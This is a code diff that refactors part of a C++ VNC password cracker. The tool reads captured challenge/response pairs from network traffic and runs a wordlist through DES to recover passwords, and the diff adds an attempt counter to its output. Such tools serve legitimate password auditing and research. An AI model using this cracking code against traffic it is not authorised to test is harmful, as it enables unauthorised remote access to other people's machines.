@@ -130,8 +130,7 @@ class VNC_Auth_Reader
    public:
       VNC_Auth_Reader(const std::string& filename) : reader(filename) {}
 
-      bool find_next(std::string& destination_address_out,
-                     std::string& source_address_out,
+      bool find_next(std::string& id_out,
                      std::string& challenge_out,
                      std::string& response_out);
 
@@ -139,8 +138,7 @@ class VNC_Auth_Reader
       Packet_Reader reader;
    };
 
-bool VNC_Auth_Reader::find_next(std::string& destination_address_out,
-                                std::string& source_address_out,
+bool VNC_Auth_Reader::find_next(std::string& id_out,
                                 std::string& challenge_out,
                                 std::string& response_out)
    {
@@ -201,8 +199,7 @@ bool VNC_Auth_Reader::find_next(std::string& destination_address_out,
             {
             challenge_out = challenge;
             response_out = response;
-            destination_address_out = to;
-            source_address_out = from;
+            id_out = "from " + from + " to " + to;
             return true;
             }
          }
@@ -240,20 +237,23 @@ void attempt_crack(VNC_Auth_Reader& reader, std::istream& wordlist)
    std::map<std::string, std::string> challenge_to_id;
    std::map<std::pair<std::string, std::string>, std::string> solutions;
 
-   std::string to, from, challenge, response;
-   while(reader.find_next(to, from, challenge, response))
+   std::string id, challenge, response;
+   while(reader.find_next(id, challenge, response))
       {
       solutions[std::make_pair(challenge, response)] = "";
-      challenge_to_id[challenge] = "from " + from + " to " + to;
+      challenge_to_id[challenge] = id;
       }
 
    std::string password;
    Botan::DES des;
    unsigned char encrypted_challenge[16] = { 0 };
+   size_t attempts = 0;
 
    while(wordlist.good())
       {
       std::getline(wordlist, password);
+
+      ++attempts;
 
       // Truncate to 8 bytes (maximum supported by VNC)
       unsigned char pass_buf[8] = { 0 };
@@ -281,7 +281,7 @@ void attempt_crack(VNC_Auth_Reader& reader, std::istream& wordlist)
             if(std::memcmp(encrypted_challenge, &response[0], 16) == 0)
                {
                std::cout << "Solved: Password '" << password << "' used "
-                         << challenge_to_id[challenge] << "\n";
+                         << challenge_to_id[challenge] << " after " << attempts << " attempts\n";
                i->second = password;
                }
             }
